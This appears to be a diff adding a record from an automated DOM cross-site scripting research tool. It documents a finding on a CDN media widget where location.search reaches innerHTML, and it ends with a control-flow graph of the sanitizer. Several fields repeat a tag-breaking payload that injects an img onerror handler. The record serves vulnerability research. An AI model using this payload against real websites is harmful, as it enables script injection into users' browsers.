@@ -1,0 +1,106 @@
+// Finding: fb3767f8-fe19-4ff0-867d-6c780057cef0
+// Finding.url: https://cdn.example262.com/widgets/media.html?url=https://example136.com/NFLonFOX/status/1349122251329859589&image=https://pbs.example137.com/ext_tw_video_thumb/1349052749787271171/pu/img/SibWMs6jEesPFzib.jpg:large&video=https://video.example137.com/ext_tw_video/1349052749787271171/pu/vid/720x720/w40K2qIq5o0kHUAd.mp4?tag=10"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('0a56b31ec51040b29a861c59c7320cc7')><!--/*&video_secure=true&type=video/mp4&schema=instagram
+// Finding.parentloc: https://cdn.example262.com/widgets/media.html?url=https://example136.com/NFLonFOX/status/1349122251329859589&image=https://pbs.example137.com/ext_tw_video_thumb/1349052749787271171/pu/img/SibWMs6jEesPFzib.jpg:large&video=https://video.example137.com/ext_tw_video/1349052749787271171/pu/vid/720x720/w40K2qIq5o0kHUAd.mp4?tag=10"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('0a56b31ec51040b29a861c59c7320cc7')><!--/*&video_secure=true&type=video/mp4&schema=instagram
+// Finding.domain: cdn.example262.com
+// Finding.base_domain: example262.com
+// Finding.source: location.search
+// Finding.sink: innerHTML
+// Sanitizer.score: 14
+// Sanitizer.name: r/<
+// Sanitizer.location: https://cdn.example262.com/widgets/media.html?url=https://example136.com/NFLonFOX/status/1349122251329859589&image=https://pbs.example137.com/ext_tw_video_thumb/1349052749787271171/pu/img/SibWMs6jEesPFzib.jpg:large&video=https://video.example137.com/ext_tw_video/1349052749787271171/pu/vid/720x720/w40K2qIq5o0kHUAd.mp4?tag=10"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('0a56b31ec51040b29a861c59c7320cc7')><!--/*&video_secure=true&type=video/mp4&schema=instagram - r/<:8:21555
+// Finding.begin: 376
+// Finding.end: 383
+// Finding.original_uuid: ac3ae387-213c-44e8-a2cc-1b652cfa1ef3
+// Finding.TwentyFiveMillionFlowsId: 499234071
+// Finding.script: https://cdn.example262.com/widgets/media.html?url=https://example136.com/NFLonFOX/status/1349122251329859589&image=https://pbs.example137.com/ext_tw_video_thumb/1349052749787271171/pu/img/SibWMs6jEesPFzib.jpg:large&video=https://video.example137.com/ext_tw_video/1349052749787271171/pu/vid/720x720/w40K2qIq5o0kHUAd.mp4?tag=10"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('0a56b31ec51040b29a861c59c7320cc7')><!--/*&video_secure=true&type=video/mp4&schema=instagram
+// Finding.line: 9
+// Exploit.uuid: 0a56b31e-c510-40b2-9a86-1c59c7320cc7
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: "
+// Exploit.tag: source
+// Exploit.break_out: https://video.example137.com/ext_tw_video/1349052749787271171/pu/vid/720x720/w40K2qIq5o0kHUAd.mp4?tag=10"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: https://video.example137.com/ext_tw_video/1349052749787271171/pu/vid/720x720/w40K2qIq5o0kHUAd.mp4?tag=10"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 210
+// Exploit.end_taint_url: 309
+// Exploit.replace_begin_url: 210
+// Exploit.replace_end_url: 309
+// Exploit.replace_begin_param: 227
+// Exploit.replace_end_param: 326
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: true
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 666654371
+// DepGraph.sanitizer_hash: 1936838779
+// Merged split and join statements 
+// Removed LR concats 
+// Removed LR concats 
+// Removed LR concats 
+// Removed LR concats 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="substr"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=box, label="Lit: 1"];
+n4 [shape=ellipse, label="split"];
+n5 [shape=box, label="Lit: &"];
+n6 [shape=box, label="Var: x"];
+n7 [shape=ellipse, label="preg_replace"];
+n8 [shape=box, label="RegExp: /[=]/"];
+n9 [shape=box, label="Lit: ="];
+n10 [shape=box, label="Var: x"];
+n11 [shape=ellipse, label="decodeURIComponent"];
+n12 [shape=box, label="Var: x"];
+n13 [shape=ellipse, label="str_replace_once"];
+n14 [shape=box, label="RegExp: /#x\d\d;/"];
+n15 [shape=box, label="Lit: "];
+n16 [shape=box, label="Var: x"];
+n17 [shape=ellipse, label="preg_replace"];
+n18 [shape=box, label="RegExp: /[^-A-Za-z0-9+&@#\/%?=~_|!:,.;\(\)]/"];
+n19 [shape=box, label="Lit: "];
+n20 [shape=box, label="Var: x"];
+n21 [shape=box, label="Var: x"];
+n22 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n1 -> n3;
+n6 -> n1;
+n4 -> n5;
+n4 -> n6;
+n10 -> n4;
+n7 -> n8;
+n7 -> n9;
+n7 -> n10;
+n12 -> n7;
+n11 -> n12;
+n16 -> n11;
+n13 -> n14;
+n13 -> n15;
+n13 -> n16;
+n20 -> n13;
+n17 -> n18;
+n17 -> n19;
+n17 -> n20;
+n21 -> n17;
+n22 -> n21;
+}
